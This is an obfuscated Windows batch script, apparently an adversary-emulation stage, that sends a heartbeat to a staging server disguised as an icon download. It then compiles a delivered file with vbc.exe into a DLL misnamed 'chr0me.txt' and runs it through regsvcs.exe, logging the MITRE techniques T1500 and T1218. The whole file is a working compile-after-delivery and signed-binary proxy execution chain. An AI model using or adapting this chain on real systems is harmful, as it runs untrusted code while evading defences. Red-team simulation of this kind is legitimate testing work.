@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\8614\9edabc9e
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?8614-7
SET lqyereup=ITZEL-S2BS
SET ufeybybm=7
SET hpnjatpj=chr0me.txt
SET njozco=file.txt
SET kkjwr=8614
SET LOG_FILE=%APPDATA%\!ufeybybm!\macula-simulations.log
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: heartbeat_start=>> "!LOG_FILE!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: heartbeat_end=>> "!LOG_FILE!" 2>nul
SET rzfg=0
SET iysld=
cd /d "!recnn!" 2>nul
if errorlevel 1 (SET rzfg=1&SET iysld=chdir_failed)
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: chdir_end=!errorlevel!>> "!LOG_FILE!" 2>nul
SET jxvgm=0
SET yqtnk=
vbc.exe /target:library /reference:System.EnterpriseServices.dll "!njozco!" /out:"!hpnjatpj!" 2>nul
if errorlevel 1 (SET jxvgm=1&SET yqtnk=compile_failed)
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: compile_end=!errorlevel!>> "!LOG_FILE!" 2>nul
echo [%DATE% %TIME%][!lqyereup!]: !ufeybybm!-!kkjwr!-T1500|Compile After Delivery=!jxvgm!:!yqtnk!>> "!LOG_FILE!" 2>nul
SET dfss=0
SET shsfs=
regsvcs.exe "!hpnjatpj!" 2>nul
if errorlevel 1 (SET dfss=1&SET shsfs=regsvcs_failed)
echo [%DATE% %TIME%][DEBUG][!lqyereup!]: regsvcs_end=!errorlevel!>> "!LOG_FILE!" 2>nul
echo [%DATE% %TIME%][!lqyereup!]: !ufeybybm!-!kkjwr!-T1218|System Binary Proxy Execution=!dfss!:!shsfs!>> "!LOG_FILE!" 2>nul